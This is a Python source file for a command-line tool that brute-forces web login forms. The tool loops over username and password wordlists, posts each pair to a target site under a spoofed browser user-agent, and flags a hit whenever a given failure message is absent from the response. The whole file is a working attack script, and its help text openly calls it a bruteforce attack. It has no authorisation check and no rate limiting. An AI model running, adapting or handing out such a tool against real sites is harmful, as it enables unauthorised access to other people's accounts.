__author__ = "Etquamor"
__date__ = "31.01.2019"

import requests
import argparse
import time

def parameterChecker():
    parser = argparse.ArgumentParser()
    parser.add_argument("--site","-s", help="You need enter site which you want to do bruteforce attack", required=True, type=str)
    parser.add_argument("--wordlist","-w", help="You need enter wordlist path which you want to try on site",required=True, type=str)
    parser.add_argument("--username","-u", help="You need enter username(s) which you want to try on site", nargs="+", type=str)
    parser.add_argument("--usernamelist","-ul", help="You need enter username path which you want to try on site", type=str)
    parser.add_argument("--failureresponse","-f", help="You need enter failure response which when you enter wrong password on site, failure response in site source code. e.g / \"Invalid password!\"" ,nargs="+", required=True, type=str)
    parser.add_argument("--sourceuser","-su", help="You need enter username which username in site source code", type=str)
    parser.add_argument("--sourcepass","-sp", help="You need enter password which password in site source code", required=True, type=str)
    parser.add_argument("--cookie","-c", help="Enter cookie (Optional)", action='store_true')
    arguments = parser.parse_args()  
        
    if (arguments.username or arguments.usernamelist) and not arguments.sourceuser:
        print("\n[#] Please enter source code name of username.\n")
        exit()

    if arguments.sourceuser and (not arguments.username and not arguments.usernamelist):
        print("\n[#] Please enter username or username list.\n")
        exit()
    
    if arguments.username and arguments.usernamelist:
        print("\n[#] You can't use username and usernamelist on same time")
        exit()
    
    if arguments.cookie:
        cookie = input("Cookie\n=>")
    else:
        cookie = False

    if not arguments.username:
        arguments.username = False
    if not arguments.usernamelist:
        arguments.usernamelist = False
    if not arguments.sourceuser:
        arguments.sourceuser = False
    
    prepareBruteforce(arguments.site, arguments.wordlist, arguments.sourcepass, arguments.failureresponse, arguments.username, arguments.usernamelist, arguments.sourceuser, cookie)
    
def prepareBruteforce(site, wordlist, sourceCodePassword, failureResponse, username, userList, sourceCodeUsername, cookie):
    user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"
    host = hostCreator(site)
    headers = {
            'User-Agent': user_agent,
            'Host': host,
            }
    if cookie:
        headers['Cookie'] = "".join(cookie.split(" "))
    passwordList = wordlistEditor(wordlist)
    if userList:
        username = usernamelistEditor(userList)
    bruteforce(site, username, passwordList, headers, sourceCodeUsername, sourceCodePassword, " ".join(failureResponse))
    
def hostCreator(site):
    if "http://" in site or "https://" in site:
        site = site.split("://",1)[1]
    if "/" in site:
        site = site.split("/",1)[0]
    return site

def askToShowSourceCode(sourceCode):
    while True:
        askForPageSource = input("Do you want to show loginned page source ? [y/n] ")
        if askForPageSource.strip().lower() == "y":
            print("\n\nPage Source\n-----------\n"+str(sourceCode))
            break
        elif askForPageSource.strip().lower() == "n":
            break
        else:
            print(askForPageSource,"is not a option please try again with \"y\" or \"n\"\n")

def usernamelistEditor(userlistPath):
    usernames = []
    with open(userlistPath,"r") as userlistFile:    
        for i in userlistFile.readlines():
            usernames.append(i.strip())
    return usernames

def wordlistEditor(wordlistPath):
    passwords = []
    with open(wordlistPath,"r") as wordlistFile:    
        for i in wordlistFile.readlines():
            passwords.append(i.strip())
    return passwords

def bruteforce(site, username, passwordList, postHeaders, userSourceame, passSourcename, failureResponse):
    try:
        passwordFound = False
        print("\n\n[*] Bruteforce started!\n\n")
        if username:
            for user in username:
                for password in passwordList:
                    print("Trying \t||\tUsername:",user,"\t==>\t","Password:",password)
                    reqq = requests.post(site, headers = postHeaders, data = {
                            userSourceame: user,
                            passSourcename: password
                        }
                    )
                    if not failureResponse in reqq.text:
                        passwordFound = True
                        print((15*("-"))+"\n[*] Password Found!\n\n[*] Username ==>",user+"\n[*] Password ==>",password+"\n\n")
                        time.sleep(1)
                        askToShowSourceCode(reqq.text)
                        break
                    else:
                        pass
        else:
            for password in passwordList:
                print("Trying\t    ==>\t","Password:",password)
                reqq = requests.post(site, headers = postHeaders, data = {
                        passSourcename: password
                    }
                )
                if not failureResponse in reqq.text:
                    passwordFound = True
                    print((15*("-"))+"\n[*] Password Found! ==>",password+"\n\n")
                    time.sleep(1)
                    askToShowSourceCode(reqq.text)
                    break
                else:
                    pass
        if passwordFound == False:
            print("\n[-] Password not found!\n\n")
    except KeyboardInterrupt:
        print("\n[-] Pressed Ctrl+C\n")
        askToShowSourceCode(reqq.text)
        print("\nQuitting...")
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print("[-] Connection lost.\n\nQuitting...")
        time.sleep(1)
    except Exception as e:
        print("[-] Unexpected Error!\n[#] Error ==>",e)

if __name__ == "__main__":
    parameterChecker()